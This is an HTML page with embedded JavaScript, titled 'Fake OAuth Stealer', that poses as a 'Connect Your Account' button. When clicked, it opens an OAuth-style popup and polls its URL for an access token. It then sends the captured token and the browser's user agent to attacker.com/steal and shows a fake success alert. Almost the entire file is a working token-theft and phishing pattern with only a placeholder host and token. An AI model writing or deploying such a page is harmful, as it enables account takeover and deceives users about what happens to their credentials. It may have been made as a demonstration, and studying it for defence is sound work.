<!DOCTYPE html>
<html>
<head>
    <title>Fake OAuth Stealer ðŸ”¥</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            background-color: #111;
            color: white;
            height: 100vh;
            font-family: Arial, sans-serif;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            background-color: crimson;
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
        }
    </style>

<script>
// Helper function: get URL parameters (like access_token)
function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[#&]" + name + "(=([^&]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
}

let popupWindow;
let monitor;

// Step 1: Launch the fake OAuth login
function launchAttack() {
    // Open a FAKE login page that immediately redirects with a fake access token
    const fakeOAuth = "https://example.com/oauth?access_token=FAKE-TOKEN-1234";

    popupWindow = window.open(fakeOAuth, "popup", "width=600,height=600");

    setTimeout(() => {
        monitorPopup();
    }, 1500);
}

// Step 2: Monitor popup until we steal the token
function monitorPopup() {
    monitor = setInterval(() => {
        try {
            if (!popupWindow || popupWindow.closed) {
                console.log("[x] Popup closed.");
                clearInterval(monitor);
                return;
            }

            let popupURL = popupWindow.location.href;

            if (popupURL.includes("access_token=")) {
                console.log("[+] Token detected!");

                let stolenToken = getParameterByName('access_token', popupURL);
                console.log("[+] Stolen Token:", stolenToken);

                popupWindow.close();
                clearInterval(monitor);

                // Step 3: Send stolen token to attacker's server
                sendTokenToAttacker(stolenToken);

            } else {
                console.log("Waiting for access token...");
            }
        } catch (e) {
            console.log("Waiting for popup redirect...", e.message);
        }
    }, 100);
}

// Step 4: Send stolen token
function sendTokenToAttacker(token) {
    console.log("[*] Sending token to attacker's server...");

    fetch("https://attacker.com/steal", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            access_token: token,
            victim_browser: navigator.userAgent
        })
    })
    .then(() => {
        console.log("[+] Token sent successfully!");
        alert("You are now connected!"); // fake success
    })
    .catch((error) => {
        console.error("[-] Failed sending:", error);
    });
}
</script>

</head>

<body>
    <h1>Connect Your Account</h1>
    <button onclick="launchAttack()">Connect Now ðŸ”¥</button>
</body>
</html>
